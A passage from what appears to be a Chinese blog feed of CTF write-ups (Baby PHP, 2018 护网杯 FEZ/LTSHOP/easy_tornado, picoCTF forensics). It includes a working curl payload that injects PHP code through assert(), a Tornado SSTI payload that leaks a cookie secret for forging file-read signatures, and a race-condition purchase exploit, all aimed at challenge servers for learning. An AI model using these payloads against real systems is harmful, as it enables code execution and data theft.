class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'flag.php'</span>);</span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>($_GET[<span class="string">'msg'</span>]))&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$msg = $_GET[<span class="string">'msg'</span>];</span><br><span class="line"><span class="keyword">if</span>(@file_get_contents($msg)!==<span class="string">"Hello Challenge!"</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">'Wow so rude!!!!1'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Hello Hacker! Have a look around.\n"</span>;</span><br><span class="line"></span><br><span class="line">@$k1=$_GET[<span class="string">'key1'</span>];</span><br><span class="line">@$k2=$_GET[<span class="string">'key2'</span>];</span><br><span class="line"></span><br><span class="line">$cc = <span class="number">1337</span>;$bb = <span class="number">42</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(intval($k1) !== $cc || $k1 === $cc)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lol no\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(strlen($k2) == $bb)&#123;</span><br><span class="line">    <span class="keyword">if</span>(preg_match(<span class="string">'/^\d+＄/'</span>, $k2) &amp;&amp; !is_numeric($k2))&#123;</span><br><span class="line">        <span class="keyword">if</span>($k2 == $cc)&#123; </span><br><span class="line">            @$cc = $_GET[<span class="string">'cc'</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">list</span>($k1,$k2) = [$k2, $k1];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(substr($cc, $bb) === sha1($cc))&#123;</span><br><span class="line">    <span class="keyword">foreach</span> ($_GET <span class="keyword">as</span> $lel =&gt; $hack)&#123;</span><br><span class="line">        $$lel = $hack;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$‮b = <span class="string">"2"</span>;$a=<span class="string">"‮b"</span>;<span class="comment">//;1=b</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>($$a !== $k1)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">"lel no\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// plz die now</span></span><br><span class="line">assert_options(ASSERT_BAIL, <span class="number">1</span>);</span><br><span class="line">assert(<span class="string">"$bb == $cc"</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="string">"Good Job ;)"</span>;</span><br><span class="line"><span class="comment">// TODO</span></span><br><span class="line"><span class="comment">// echo $flag;</span></span><br></pre></td></tr></table></figure><p>用 <code>php -S 127.0.0.1:8080</code> 起一个本地服务用于调试。</p><p>13~15行可通过PHP wrapper 绕过。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl <span class="string">"https://arcade.fluxfingers.net:1819?msg=php://input"</span> -d <span class="string">"Hello Challenge!"</span></span><br><span class="line">or</span><br><span class="line">curl <span class="string">"https://arcade.fluxfingers.net:1819?msg=data://text/plain,Hello%20Challenge!"</span></span><br></pre></td></tr></table></figure><p>24~26行传入key1=1337即可，$k1类型为string。</p><p>29行的美元符是个宽字节字符，并不是ASCII为36的字符。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="built_in">encodeURI</span>(<span class="string">"＄"</span>)</span><br><span class="line">&lt;<span class="string">"%EF%BC%84"</span></span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">php &gt; $e=str_repeat(<span class="string">"0"</span>,<span class="number">42</span><span class="number">-3</span><span class="number">-4</span>).<span class="string">"1337 "</span>;</span><br><span class="line">php &gt; <span class="keyword">echo</span> strlen($e);</span><br><span class="line"><span class="number">42</span></span><br><span class="line">php &gt; <span class="keyword">echo</span> $e;</span><br><span class="line"><span class="number">000000000000000000000000000000000001337</span>＄</span><br></pre></td></tr></table></figure><p>38行可以通过传入数组绕过。39行有变量覆盖。</p><p>44行是个障眼法，在第一个美元符后有个Unicode 字符(<code>U+202e</code>)，用以左右反转，详见 <a href="https://rawsec.ml/en/2-less-known-tricks-spoofing-extensions/#rtlo-trick" target="_blank" rel="noopener">rtlo-trick</a>。十六进制看起来实际上是这样：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">000002f0: 24e2 80ae 6220 3d20 2232 223b 2461 3d22  $...b = <span class="string">"2"</span>;<span class="variable">$a</span>=<span class="string">"</span></span><br><span class="line"><span class="string">00000300: e280 ae62 223b 2f2f 3b31 3d62 0d0a 0d0a  ...b"</span>;//;1=b....</span><br></pre></td></tr></table></figure><p>就是说，第44行是 <code>$\u{202E}b = &quot;2&quot;;$a=&quot;\u{202E}b&quot;;//;1=b</code> ，但经过Unicode字符作用后显示出来的是<code>$b=1;//;&quot;b&quot;=a$;&quot;2&quot; = b</code> 。推荐一个辅助工具：<a href="https://r12a.github.io/app-conversion/" target="_blank" rel="noopener">https://r12a.github.io/app-conversion/</a> 。</p><p>则$$a的值为2，传入k1=2即可。</p><p>51行设置在断言失败时中止执行。</p><p>52行可以执行PHP代码。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">λ  curl -sg <span class="string">"https://arcade.fluxfingers.net:1819/?msg=data://text/plain,Hello%20Challenge!&amp;key1=1337&amp;key2=000000000000000000000000000000000001337%EF%BC%84&amp;cc[]=&amp;k1=2&amp;bb=highlight_file(%22flag.php%22);//"</span> | grep -o <span class="string">'flag&#123;.*&#125;'</span></span><br><span class="line">flag&#123;7c217708c5293a3264bb136ef1fadd6e&#125;</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h1 id=&quot;Baby-PHP&quot;&gt;&lt;a href=&quot;#Baby-PHP&quot; class=&quot;headerlink&quot; title=&quot;Baby PHP&quot;&gt;&lt;/a&gt;Baby PHP&lt;/h1&gt;&lt;p&gt;环境：&lt;a href=&quot;https://arcade.fluxfingers.net:181
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>护网杯解题记录</title>
    <link href="https://findneo.github.io/181013-huwangbei-writeup/"/>
    <id>https://findneo.github.io/181013-huwangbei-writeup/</id>
    <published>2018-10-13T16:17:37.000Z</published>
    <updated>2019-01-25T23:38:25.504Z</updated>
    
    <content type="html"><![CDATA[<p><img src="1539436751699.png" alt="1539436751699"></p><h1 id="FEZ"><a href="#FEZ" class="headerlink" title="FEZ"></a>FEZ</h1><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f</span><span class="params">(x,k)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> xor(xor(x,k),<span class="number">7</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">round</span><span class="params">(M,K)</span>:</span></span><br><span class="line">    L=M[<span class="number">0</span>:<span class="number">27</span>]</span><br><span class="line">    R=M[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">    new_l=R</span><br><span class="line">    new_r=xor(xor(R,L),K)</span><br><span class="line">    <span class="keyword">return</span> new_l+new_r</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">fez</span><span class="params">(m,K)</span>:</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> K:</span><br><span class="line">        m=round(m,i)</span><br><span class="line">    <span class="keyword">return</span> m</span><br><span class="line"></span><br><span class="line">K=[]</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">7</span>):</span><br><span class="line">    K.append(os.urandom(<span class="number">27</span>))</span><br><span class="line">m=open(<span class="string">"flag"</span>,<span class="string">"rb"</span>).read()</span><br><span class="line"><span class="keyword">assert</span> len(m)&lt;<span class="number">54</span></span><br><span class="line">m+=os.urandom(<span class="number">54</span>-len(m))</span><br><span class="line"></span><br><span class="line">test=os.urandom(<span class="number">54</span>)</span><br><span class="line"><span class="keyword">print</span> test.encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> fez(test,K).encode(<span class="string">"hex"</span>)</span><br><span class="line"><span class="keyword">print</span> fez(m,K).encode(<span class="string">"hex"</span>)</span><br></pre></td></tr></table></figure><p>假设最后一轮结束后高低字节分别为l,r，可逐轮逆推出上一轮的值，从而得到明文和密文的关系。由已知的一组test明文密文对，可得到flag的明文。</p><table><thead><tr><th>round</th><th>left</th><th>right</th></tr></thead><tbody><tr><td>0</td><td>l^r^k[0]^k[1]^k[3]^k[4]^k[6]</td><td>l^k[1]^k[2]^k[4]^k[5]</td></tr><tr><td>1</td><td>l^k[1]^k[2]^k[4]^k[5]</td><td>r^k[2]^k[3]^k[5]^k[6]</td></tr><tr><td>2</td><td>r^k[2]^k[3]^k[5]^k[6]</td><td>l^r*k[3]^k[4]^k[6]</td></tr><tr><td>3</td><td>l^r*k[3]^k[4]^k[6]</td><td>l^k[4]^k[5]</td></tr><tr><td>4</td><td>l^k[4]^k[5]</td><td>r^k[5]^k[6]</td></tr><tr><td>5</td><td>r^k[5]^k[6]</td><td>r^l^k[6]</td></tr><tr><td>6</td><td>r^l^k[6]</td><td>l</td></tr><tr><td>7</td><td>l</td><td>r</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="comment"># __author__ = findneo</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">xor</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">assert</span> len(a)==len(b)</span><br><span class="line">    c=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(a)):</span><br><span class="line">        c+=chr(ord(a[i])^ord(b[i]))</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line">all_xor = <span class="keyword">lambda</span> x:reduce(xor,x)</span><br><span class="line">test_plain=<span class="string">"c8b84d08e5a8e60a49578f387fff5a90e9e7c181734bf05be4f5403c9ea24a0b8741a329991637e11fa69019cd3b01d7c95b65f5abd5"</span></span><br><span class="line">test_cipher=<span class="string">"5c3660c27cb9b3785a5ce06022e88bc831017e882d39475ea85d919ad9e5ac498f86c553216cab1f8f7468353d46ba8971efa9ca8c81"</span></span><br><span class="line">flag_cipher=<span class="string">"519ab6fc0e435da00516b844f8fe664bfe9445992f478dc650701739a11ffda5bbeb643159d7e8cd03a2104c798a1ca734b905ee6c76"</span></span><br><span class="line"></span><br><span class="line">p=test_plain.decode(<span class="string">"hex"</span>)</span><br><span class="line">c=test_cipher.decode(<span class="string">"hex"</span>)</span><br><span class="line">f=flag_cipher.decode(<span class="string">"hex"</span>)</span><br><span class="line"></span><br><span class="line">l,r=c[<span class="number">0</span>:<span class="number">27</span>],c[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">pl,pr=p[<span class="number">0</span>:<span class="number">27</span>],p[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">fl,fr=f[<span class="number">0</span>:<span class="number">27</span>],f[<span class="number">27</span>:<span class="number">54</span>]</span><br><span class="line">fcl=all_xor([l,r,pl,fl,fr])</span><br><span class="line">fcr=all_xor([l,pr,fl])</span><br><span class="line">flag=fcl+fcr</span><br><span class="line"><span class="keyword">print</span> flag</span><br><span class="line"><span class="comment">#flag&#123;festel_weak_666_plo88112tty&#125;</span></span><br></pre></td></tr></table></figure><h1 id="LTSHOP"><a href="#LTSHOP" class="headerlink" title="LTSHOP"></a>LTSHOP</h1><p>使用burp的intruder竞争买大辣条，得到超过五个大辣条。</p><p><img src="1539428933786.png" alt="1539428933786"></p><p>然后买 <code>2**64/5+1</code> 个辣条王，使得需要付的大辣条多到uint装不下，向上溢出为负数，我们就买得起很多的辣条王了，实现一夜暴富。</p><p><img src="1539429086591.png" alt="1539429086591"></p><p>然后flag就随便买了。</p><p><img src="1539429113491.png" alt="1539429113491"></p><p><img src="1539437436657.png" alt="1539437436657"></p><h1 id="easy-tornado"><a href="#easy-tornado" class="headerlink" title="easy_tornado"></a>easy_tornado</h1><p>有三个提示：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">http://49.4.78.9:31465/file?filename=flag.txt&amp;signature=95660d430a8ad05fc7337d12e6a08b1a</span><br><span class="line">render()</span><br><span class="line">md5(cookie_secret + md5(filename))</span><br><span class="line">/fllllllllllag</span><br></pre></td></tr></table></figure><p>报错页面存在SSTI。</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">访问 `http://49.4.78.9:31465/error?msg=&#123;&#123;handler.settings&#125;&#125;`得到配置信息。</span><br><span class="line">Whoops, looks like somethings went wrong . </span><br><span class="line">&#123;'login_url': '/login', 'template_path': 'templates', 'xsrf_cookies': True, 'cookie_secret': 'pGD*~9Y]N?&gt;5zBvS_3768U+O&#125;<span class="tag">&lt;<span class="name">#^k@oM$grqZQ4!yK1ucVnijmRJlFwI%hP(0exE',</span> '<span class="attr">debug</span>'<span class="attr">:</span> <span class="attr">False</span>, '<span class="attr">file_path</span>'<span class="attr">:</span> '/<span class="attr">www</span>/<span class="attr">static</span>/<span class="attr">files</span>', '<span class="attr">static_path</span>'<span class="attr">:</span> '<span class="attr">static</span>'&#125;</span></span><br></pre></td></tr></table></figure><p>得到cookie_secret，即可构造签名读取flag。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">abc@xyz:~$ curl <span class="string">"http://49.4.78.9:31465/file?filename=/fllllllllllag&amp;signature=8f270fa794962fa2ec4e63e6b03a830b"</span> -s | grep flag</span><br><span class="line">flag&#123;59a95928373bfa789e06635d2d5e9459&#125;</span><br></pre></td></tr></table></figure><p>参考：<a href="https://www.cnblogs.com/bwangel23/p/4858870.html" target="_blank" rel="noopener">https://www.cnblogs.com/bwangel23/p/4858870.html</a> </p><h1 id="更多题解"><a href="#更多题解" class="headerlink" title="更多题解"></a>更多题解</h1><ul><li><a href="https://xz.aliyun.com/t/2893" target="_blank" rel="noopener">护网杯2018线上赛 Writeup by Whitzard</a> </li><li><a href="https://xz.aliyun.com/t/2897" target="_blank" rel="noopener">2018护网杯线上赛 Writeup by 天枢</a> </li><li><a href="https://xz.aliyun.com/t/2892" target="_blank" rel="noopener">2018护网杯线上赛题解by Lilac</a> </li><li><a href="http://www.venenof.com/index.php/archives/565/" target="_blank" rel="noopener">护网杯-easy laravel-Writeup</a> </li><li><a href="http://skysec.top/2018/10/13/2018%E6%8A%A4%E7%BD%91%E6%9D%AF-web-writeup/" target="_blank" rel="noopener">2018护网杯-web-writeup</a> </li></ul>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;&lt;img src=&quot;1539436751699.png&quot; alt=&quot;1539436751699&quot;&gt;&lt;/p&gt;
&lt;h1 id=&quot;FEZ&quot;&gt;&lt;a href=&quot;#FEZ&quot; class=&quot;headerlink&quot; title=&quot;FEZ&quot;&gt;&lt;/a&gt;FEZ&lt;/h1&gt;&lt;figure clas
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>picoCTF-2018 解题报告</title>
    <link href="https://findneo.github.io/180929-picoctf/"/>
    <id>https://findneo.github.io/180929-picoctf/</id>
    <published>2018-10-11T14:07:27.000Z</published>
    <updated>2019-01-25T23:21:37.114Z</updated>
    
    <content type="html"><![CDATA[<p><img src="1539266772853.png" alt="1539266772853"></p><p>题目：</p><ul><li><a href="https://2018game.picoctf.com/problems" target="_blank" rel="noopener">https://2018game.picoctf.com/problems</a></li><li>备用：<a href="https://findneo.github.io/p/picoCTF-2018-Problems.html">https://findneo.github.io/p/picoCTF-2018-Problems.html</a> </li><li>附件：<a href="https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf" target="_blank" rel="noopener">https://github.com/findneo/ctfgodown/tree/master/20180929-picoctf</a> </li></ul><h1 id="Forensics"><a href="#Forensics" class="headerlink" title="Forensics"></a>Forensics</h1><h2 id="Forensics-Warmup-1"><a href="#Forensics-Warmup-1" class="headerlink" title="Forensics Warmup 1"></a>Forensics Warmup 1</h2><p><code>picoCTF{welcome_to_forensics}</code> </p><h2 id="Forensics-Warmup-2"><a href="#Forensics-Warmup-2" class="headerlink" title="Forensics Warmup 2"></a>Forensics Warmup 2</h2><p><code>picoCTF{extensions_are_a_lie}</code> </p><h2 id="Desrouleaux"><a href="#Desrouleaux" class="headerlink" title="Desrouleaux"></a>Desrouleaux</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><span class="line">nc 2018shell2.picoctf.com 63299</span><br><span class="line">You<span class="string">'ll need to consult the file `incidents.json` to answer the following questions.</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">What is the most common source IP address? If there is more than one IP address that is the most common, you may give any of the most common ones.</span></span><br><span class="line"><span class="string">250.226.237.236</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">How many unique destination IP addresses were targeted by the source IP address 193.1.59.100?</span></span><br><span class="line"><span class="string">2</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">What is the average number of unique destination IP addresses that were sent a file with the same hash? Your answer needs to be correct to 2 decimal places.</span></span><br><span class="line"><span class="string">1.43</span></span><br><span class="line"><span class="string">Correct!</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">Great job. You'</span>ve earned the flag: picoCTF&#123;J4y_s0n_d3rUUUULo_23fa6fa6&#125;</span><br><span class="line"></span><br><span class="line">/*精确到小数点后两位 (1+1+2+1+3+1+1)/7=1.43</span><br><span class="line"></span><br><span class="line">import json</span><br><span class="line">j=json.load(open(<span class="string">'incidents.json'</span>))</span><br><span class="line">tickets=j[<span class="string">'tickets'</span>]</span><br><span class="line">hashes=dict()</span><br><span class="line"><span class="keyword">for</span> t <span class="keyword">in</span> tickets:</span><br><span class="line"><span class="keyword">if</span> t[<span class="string">'file_hash'</span>] not <span class="keyword">in</span> hashes.keys():</span><br><span class="line">hashes[t[<span class="string">'file_hash'</span>]]=[t[<span class="string">'dst_ip'</span>]]</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">hashes[t[<span class="string">'file_hash'</span>]].append(t[<span class="string">'dst_ip'</span>])</span><br><span class="line"><span class="built_in">print</span> hashes</span><br><span class="line"><span class="comment"># &#123;</span></span><br><span class="line"><span class="comment"># u'78d8572c143fb161': [u'90.174.224.210'], </span></span><br><span class="line"><span class="comment"># u'a275ec611d018a67': [u'94.165.167.88'], </span></span><br><span class="line"><span class="comment"># u'308f80097c708e3d': [u'90.174.224.210', u'216.243.24.241'], </span></span><br><span class="line"><span class="comment"># u'27d9b03884d73aaa': [u'94.165.167.88'], </span></span><br><span class="line"><span class="comment"># u'23420f902d5382e1': [u'94.165.167.88', u'16.139.98.188', u'46.11.226.205'], </span></span><br><span class="line"><span class="comment"># u'ea45791ce3528103': [u'127.19.170.162'], </span></span><br><span class="line"><span class="comment"># u'729b56eab8ac3252': [u'94.165.167.88']&#125;</span></span><br><span class="line">*/</span><br></pre></td></tr></table></figure><h2 id="Reading-Between-the-Eyes"><a href="#Reading-Between-the-Eyes" class="headerlink" title="Reading Between the Eyes"></a>Reading Between the Eyes</h2><p><img src="1538361495312.png" alt="1538361495312"></p><p><code>picoCTF{r34d1ng_b37w33n_7h3_by73s}</code> </p><h2 id="Recovering-From-the-Snap"><a href="#Recovering-From-the-Snap" class="headerlink" title="Recovering From the Snap"></a>Recovering From the Snap</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">root@kali:~/桌面/picoctf<span class="comment"># file animals.dd</span></span><br><span class="line">animals.dd: DOS/MBR boot sector, code offset 0x3c+2, OEM-ID <span class="string">"mkfs.fat"</span>, sectors/cluster 4, root entries 512, sectors 20480 (volumes &lt;=32 MB), Media descriptor 0xf8, sectors/FAT 20, sectors/track 32, heads 64, reserved 0x1, serial number 0x9b664dde, unlabeled, FAT (16 bit)</span><br><span class="line">root@kali:~/桌面/picoctf<span class="comment"># fdisk -lu animals.dd</span></span><br><span class="line">Disk animals.dd: 10 MiB, 10485760 bytes, 20480 sectors</span><br><span class="line">Units: sectors of 1 * 512 = 512 bytes</span><br><span class="line">Sector size (logical/physical): 512 bytes / 512 bytes</span><br><span class="line">I/O size (minimum/optimal): 512 bytes / 512 bytes</span><br><span class="line">Disklabel <span class="built_in">type</span>: dos</span><br><span class="line">Disk identifier: 0x00000000</span><br></pre></td></tr></table></figure><p>参考 <a href="https://www.bleepingcomputer.com/forums/t/522890/imagedd-file-of-a-corrupted-external-hd-looking-to-mountrecover/" target="_blank" rel="noopener">这里</a> ，使用<a href="https://www.osforensics.com/tools/mount-disk-images.html" target="_blank" rel="noopener">OSFMount</a> 挂载磁盘，使用 <a href="https://www.cgsecurity.org/wiki/TestDisk_Download" target="_blank" rel="noopener">TestDisk &amp; PhotoRec 7.1-WIP, Data Recovery</a> 恢复被删除的<code>theflag.jpg</code> 。</p><p><code>picoCTF{th3_5n4p_happ3n3d}</code> </p><p><img src="1538323453203.png" alt="1538323453203"></p><h2 id="admin-panel"><a href="#admin-panel" class="headerlink" title="admin panel"></a>admin panel</h2><p>用wireshark打开，导出HTTP对象，其中一个文件内容是<code>user=admin&amp;password=picoCTF{n0ts3cur3_df598569}</code> 。</p><h2 id="hex-editor"><a href="#hex-editor" class="headerlink" title="hex editor"></a>hex editor</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings hex_editor.jpg | grep pico</span><br><span class="line">Your flag is: <span class="string">"picoCTF&#123;and_thats_how_u_edit_hex_kittos_8BcA67a2&#125;"</span></span><br></pre></td></tr></table></figure><h2 id="Truly-an-Artist"><a href="#Truly-an-Artist" class="headerlink" title="Truly an Artist"></a>Truly an Artist</h2><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">strings 2018.png | grep pico</span><br><span class="line">picoCTF&#123;look_in_image_9f5be995&#125;</span><br></pre></td></tr></table></figure><h2 id="now-you-don’t"><a href="#now-you-don’t" class="headerlink" title="now you don’t"></a>now you don’t</h2><p><img src="1538239287549.png" alt="1538239287549"></p><p><code>picoCTF{n0w_y0u_533_m3}</code></p><h2 id="Ext-Super-Magic"><a href="#Ext-Super-Magic" class="headerlink" title="Ext Super Magic"></a>Ext Super Magic</h2><p>根据提示使用debugfs查看img文件，发现幻数损坏。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># debugfs ext.img</span></span><br><span class="line">debugfs 1.44.4 (18-Aug-2018)</span><br><span class="line">debugfs: Bad magic number <span class="keyword">in</span> super-block <span class="keyword">while</span> trying to open ext.img</span><br><span class="line">.......</span><br></pre></td></tr></table></figure><p>从文档（<a href="https://wiki.osdev.org/Ext2#Superblock" target="_blank" rel="noopener">https://wiki.osdev.org/Ext2#Superblock</a>）可以看到使用ext2文件系统的第一步是寻找、提取、解析superblock。superblock总是从卷的1024字节开始，长度为1024字节。也就是说，如果一个扇区是512字节，那么superblock位于第2、3扇区。而在superblock中，ext2文件的signature（0xef53）位于第56、57两个字节，所以我们要修正文件的magic number为正确的signature，也就是修改(1024+56,1024+57)bytes即(1080,1081)bytes即(0x438,0x439)bytes的值为<code>0xef53</code> 。需注意采用小端序，低字节在低地址。</p><p><img src="1541167493772.png" alt="1541167493772"></p><p>根据文档修改superblock，然后可以mount到系统，发现有个flag图片。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># file fix.img</span></span><br><span class="line">fix.img: Linux rev 1.0 ext2 filesystem data, UUID=a3708ef2-5ec0-4463-9a03-599c890645cd (large files)</span><br><span class="line"><span class="comment"># xxd ext.img &gt; ext.hex</span></span><br><span class="line"><span class="comment"># xxd fix.img &gt; fix.hex</span></span><br><span class="line"><span class="comment"># diff *.hex</span></span><br><span class="line">68c68</span><br><span class="line">&lt; 00000430: 34dc ad5b 0100 ffff 0000 0100 0100 0000  4..[............</span><br><span class="line">---</span><br><span class="line">&gt; 00000430: 34dc ad5b 0100 ffff 53ef 0100 0100 0000  4..[....S.......</span><br><span class="line"><span class="comment"># mkdir tmpdir &amp;&amp; mount fix.img tmpdir &amp;&amp; ll tmpdir/ | grep flag</span></span><br></pre></td></tr></table></figure><p><img src="1541122722339.png" alt="1541122722339"></p><p><img src="1541122685539.png" alt="1541122685539"></p><p>尝试了多个命令行OCR工具，tesseract-ocr效果最好，但识别结果还需要修正。</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$apt</span> install gocr</span><br><span class="line"><span class="variable">$apt</span> install cuneiform</span><br><span class="line"><span class="variable">$apt</span> install 